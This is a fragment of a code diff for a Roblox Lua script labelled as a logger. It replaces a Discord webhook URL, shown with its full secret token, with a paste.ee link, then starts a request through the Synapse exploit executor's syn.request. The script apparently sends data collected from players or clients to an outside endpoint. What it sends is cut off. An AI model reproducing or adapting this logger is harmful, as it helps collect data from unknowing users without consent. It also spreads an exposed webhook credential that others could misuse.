@@ -1,7 +1,7 @@
 --logger
 
 Http = game:GetService("HttpService")
-Web = "https://discord.com/api/webhooks/1061705450426474506/gXnQxyk_3GKxp-aRJD3D_ybRnwJGBb2AFFoS_Ps7TTfZPhwUAGFOQiPgvRCKbkmfafeU"
+Web = "https://paste.ee/r/5DVML"
 
 if syn then
     local responce = syn.request(
